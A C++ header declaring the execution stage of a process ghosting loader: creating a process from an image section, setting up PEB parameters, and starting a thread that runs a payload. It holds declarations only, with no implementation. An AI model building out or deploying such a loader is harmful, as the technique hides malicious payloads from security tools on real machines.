#pragma once

#include "Common.hpp"
#include "PayloadManager.hpp"

// ProcessExecutor
// Responsibility: Handles the final stage of the ghosting attack:
// Creating the process from the section, creating the initial thread,
// and resuming execution.
class ProcessExecutor
{
public:
    // Creates a process object from the image section
    // Returns the process handle, or NULL on failure
    static HANDLE CreateProcessFromSection(HANDLE sectionHandle);

    // Creates the primary thread in the target process
    // Returns the thread handle, or NULL on failure
    static HANDLE CreateProcessThread(HANDLE processHandle, uint32_t entryPointRVA);

    // Resumes the thread to start execution of the payload
    static bool ExecutePayload(HANDLE threadHandle);

    // Writes RTL_USER_PROCESS_PARAMETERS into the new process's PEB so the
    // loader can initialize correctly. Must be called before the first thread starts.
    static bool SetupProcessParameters(HANDLE processHandle, const std::wstring &imagePath);

    // High-level orchestrator to run the entire execution chain
    static bool Run(HANDLE sectionHandle, uint32_t entryPointRVA, const std::wstring &imagePath);
};
